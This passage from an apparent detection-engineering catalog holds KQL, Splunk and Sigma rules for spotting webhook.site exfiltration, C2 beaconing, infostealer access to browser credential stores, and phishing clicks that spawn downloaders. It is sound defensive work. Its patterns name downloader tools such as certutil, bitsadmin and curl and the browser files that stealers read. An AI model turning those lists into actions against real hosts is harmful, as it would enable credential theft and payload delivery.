        "msedge.exe","wscript.exe","cscript.exe","cmd.exe")
    | extend Indicator = case(
        Url has "docopened.jpg", "INCLUDEPICTURE_tracker",
        ActingProcessName has "winword", "Office_to_webhook.site",
        ActingProcessName has "msedge", "Edge_exfil_or_payload",
        "Script_host_to_webhook.site")
    | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, HttpMethod, Url, Indicator;
let proxy_hits = CommonSecurityLog
    | where TimeGenerated > ago(14d)
    | where DestinationHostName has "webhook.site" or RequestURL has "webhook.site"
    | extend Indicator = iff(RequestURL has "docopened.jpg", "INCLUDEPICTURE_tracker", "webhook.site_traffic")
    | project TimeGenerated, Computer=SourceHostName, ActorUsername=SourceUserName,
              ActingProcessName=tostring(SourceProcessName),
              HttpMethod=RequestMethod, Url=RequestURL, Indicator;
union isfuzzy=true webhook_hits, proxy_hits
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT

    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
